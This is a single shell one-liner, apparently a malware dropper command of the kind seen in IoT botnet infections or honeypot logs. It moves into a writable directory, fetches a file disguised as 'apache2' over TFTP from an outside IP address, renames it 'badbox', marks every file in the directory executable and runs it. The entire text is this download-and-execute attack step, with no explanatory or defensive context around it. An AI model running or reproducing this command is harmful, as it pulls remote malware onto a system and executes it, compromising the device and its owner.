cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 185.55.218.239 -c get apache2;cat apache2 >badbox;chmod +x *;./badbox
